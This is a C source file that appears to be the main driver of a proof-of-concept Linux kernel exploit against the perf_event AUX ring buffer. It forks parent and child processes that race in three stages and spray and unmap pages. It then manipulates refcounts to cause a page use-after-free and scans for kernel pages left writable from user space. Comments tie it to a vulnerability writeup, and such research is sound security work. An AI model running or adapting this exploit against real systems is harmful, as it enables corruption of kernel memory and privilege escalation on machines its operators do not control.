#define _GNU_SOURCE
#include <stdio.h>
#include <linux/perf_event.h>
#include <linux/hw_breakpoint.h>
#include <sys/syscall.h>
#include <unistd.h>
#include <stdlib.h>
#include <string.h>
#include <sys/mman.h>
#include <sys/ioctl.h>

#include <time.h>
#include <stdint.h>
#include <pthread.h>
#include <errno.h>
#include <math.h>
#include "exploit.h"

struct exp_sync *global_exp_data = NULL;

//The child process holds on to all of the broken references
//If the spray fails the child can be orphaned and the parent can exit cleanly
//and just leak some memory without crashing the system
int proc_child()
{
    assignToThisCore(1);
    stage1_child((void*)(uint64_t)global_exp_data->fd2);
    if(!global_exp_data->stage1.success)
    {
        fprintf(stderr, "[C] First stage failed, bailing\n");
        return -1;
    }
    global_exp_data->stage2.extra_vma = global_exp_data->stage1.extra_vma;
    stage2_child((void*)(uint64_t)global_exp_data->fd2);
    if(!global_exp_data->stage2.success)
    {
        fprintf(stderr, "[C] Second stage failed, bailing\n");
        return -1;
    }
    global_exp_data->stage3.mapped_start = global_exp_data->stage2.mapped_start;
    global_exp_data->stage3.mapped_end = global_exp_data->stage2.mapped_end;
    stage3_child();
    return 0;
}

int proc_parent()
{
        unsigned long vma_size = TARGET_RB_SIZE;
        void* mapped = mmap(0, vma_size, PROT_READ|PROT_WRITE,MAP_SHARED, global_exp_data->fd1, 0);
        if(mapped == MAP_FAILED)
            perror_exit("mmap");

        if(ioctl(global_exp_data->fd2, PERF_EVENT_IOC_SET_OUTPUT, global_exp_data->fd1)<0)
            perror_exit("set_output ioctl");
        printf("[+] redirected event2->event1\n");

        struct perf_event_mmap_page *user_page = mapped;
        user_page->aux_offset = TARGET_AUX_OFFSET;
        user_page->aux_size = TARGET_AUX_SIZE;

        assignToThisCore(0);

        stage1_parent((void*)(uint64_t)global_exp_data->fd1);
        if(!global_exp_data->stage1.success)
        {
            printf("[P] First stage failed, bailing\n");
            exit(-1);
        }


        user_page->aux_size = TARGET_AUX_UNMAP_SIZE;
        stage2_parent((void*)(uint64_t)global_exp_data->fd1);
        if(!global_exp_data->stage2.success)
        {
            printf("[P] Second stage failed, bailing\n");
            exit(-1);
        }

        stage3_parent();


        printf("[P] Found %d writable page(s) in %d iterations\n", global_exp_data->stage3.writable_page_count, global_exp_data->stage3.num_iterations);

        //Clear up the sprayed pages we didn't find first
        //So that when we cause the UAF of the pages we DID find
        //they will be the most recently freed ones
        for(int i=0; i<SPRAY_NUM; i++)
        {
            if(!page_already_found(&global_exp_data->stage3, NULL, i))
            {
                munmap((void*)global_exp_data->stage3.spray_infos[i].map, STAGE3_MMAP_SIZE);
                close(global_exp_data->stage3.spray_infos[i].fd);
                global_exp_data->stage3.spray_infos[i].fd = -1;
            }
        }

        //If we didn't find any writable pages we exit the parent and we keep the child process
        //alive, so that we don't crash the kernel
        if(!global_exp_data->stage3.writable_page_count)
        {
            fprintf(stderr, "Couldn't find any writable pages. Will leave child process alive to avoid system instability\n");
            exit(0);
        }

        printf("[P] Doing refcount manipulation\n");
        for(int i=0; i<global_exp_data->stage3.writable_page_count; i++)
        {
            //Unmap page from vma, but keep vma alive
            int idx = global_exp_data->stage3.writable_pages[i].page_index;
            madvise((void*)global_exp_data->stage3.spray_infos[idx].map,PAGE_SIZE, MADV_DONTNEED);
            void* new_map = (void*)global_exp_data->stage3.spray_infos[idx].map;
            
            if(new_map==MAP_FAILED)
            {
                perror_exit("mmap writable rb");
            }
            global_exp_data->stage3.writable_pages[i].writable_page=new_map;
        }

        /************************************************************************************************************************************
         * THIS IS THE END OF THE WRITEUP
         * ==================================================================================================================================
         * The rest of the PoC just does some trivial spraying and scanning of the pages we found to demonstrate that pages are indeed reused
         ***********************************************************************************************************************************/
        printf("[P] Checking for change and spraying\n");
        int done = 0;
        int spray_fds2[100][2] = {0};
        while(!done)
        {
            //Spraying some kernel structures so that we can see if the kernel reuses them
            for(int i=0; i<100; i++)
                pipe(spray_fds2[i]);

            for(int i=0; i<global_exp_data->stage3.writable_page_count; i++)
            {
                char* curr = (char*)global_exp_data->stage3.writable_pages[i].writable_page;
                int idx = global_exp_data->stage3.writable_pages[i].page_index;
                for(char* s=curr; s<curr+PAGE_SIZE; s+=8)
                {
                    //Value as pointer corresponds to something in the kernel address range
                    if(*((unsigned long long*)s)>(1ULL<<63))
                    {
                        printf("[P] Writable page changed\n");
                        //Adjust this if you want to print more or less
                        hexdump(curr, PAGE_SIZE/4);
                        done=1;
                        break;
                    }
                }
                if(done)
                    break;
            }
            for(int i=0; i<100; i++)
                if(spray_fds2[i][0]>=0)
                {
                    close(spray_fds2[i][0]);
                    close(spray_fds2[i][1]);
                }
        }

        printf("[P] Main thread done\n");
        printf("[P] Spinning\n");
        while(1){}
}

int shared_setup(int perf_fd, int perf_fd2)
{
    global_exp_data = mmap(0,sizeof(*global_exp_data), PROT_READ|PROT_WRITE,MAP_ANON|MAP_SHARED,-1,0);
    if(global_exp_data==MAP_FAILED)
        perror_exit("exp_data mmap");
    
    memset(global_exp_data,0, sizeof(*global_exp_data));
    global_exp_data->fd1 = perf_fd;
    global_exp_data->fd2 = perf_fd2;
    global_exp_data->stage1.usec_delay = RACE_DELAY_AVG;
    global_exp_data->stage1.usec_delay_max = RACE_DELAY_AVG+RACE_DELAY_RANGE;
    global_exp_data->stage1.usec_delay_min = RACE_DELAY_AVG-RACE_DELAY_RANGE;
    race_barrier_init(&global_exp_data->stage1.rdy_barrier, NUM_RACERS);
    race_barrier_init(&global_exp_data->stage1.result_barrier, NUM_RACERS);
    race_barrier_init(&global_exp_data->stage2.rdy_barrier, NUM_RACERS);
    race_barrier_init(&global_exp_data->stage2.result_barrier, NUM_RACERS);
    race_barrier_init(&global_exp_data->stage3.rdy_barrier, NUM_RACERS);
    race_barrier_init(&global_exp_data->stage3.spray_barrier, NUM_RACERS);
    race_barrier_init(&global_exp_data->stage3.change_barrier, NUM_RACERS);
    race_barrier_init(&global_exp_data->stage3.check_barrier, NUM_RACERS);
    race_barrier_init(&global_exp_data->stage3.result_barrier, NUM_RACERS);
}


int main(int argc, char* argv[])
{
    printf("[+] Opening event fd\n");
    int perf_fd = get_aux_mappable_fd();
    if(perf_fd<0)
    {
        printf("[-] Couldn't find aux mappable event_pmu\n");
        exit(-1);
    }
    //Second event fd doesn't need to be aux mappable at all, in fact it shouldn't be for the oracle to work
    //So just open the software dummy event
    struct perf_event_attr attrs = {0};
    memset((char*)&attrs,0,sizeof(attrs));
    attrs.size = sizeof(attrs);
    attrs.disabled = 1;
    attrs.exclude_kernel = 1;
    attrs.exclude_hv = 1;
    attrs.type = PERF_TYPE_SOFTWARE;
    attrs.config = PERF_COUNT_SW_DUMMY;
    int perf_fd2 = perf_event_open(&attrs,0,-1,-1,0);
    if(perf_fd2<0)
    {
        printf("[-] ret=%d\n",perf_fd2);
        perror_exit("[-] perf_event_open 2");
    }
    printf("[+] Opened event fds\n");
    
    shared_setup(perf_fd, perf_fd2);

    if(fork()==0)
    {
        if(proc_child())
        {
            exit(-1);
        }
        printf("[C] Spinning\n");
        while(1){
            sleep(60);
        }
        exit(0);
    }
    else
    {
        if(proc_parent())
        {
            exit(-1);
        }
    }
}
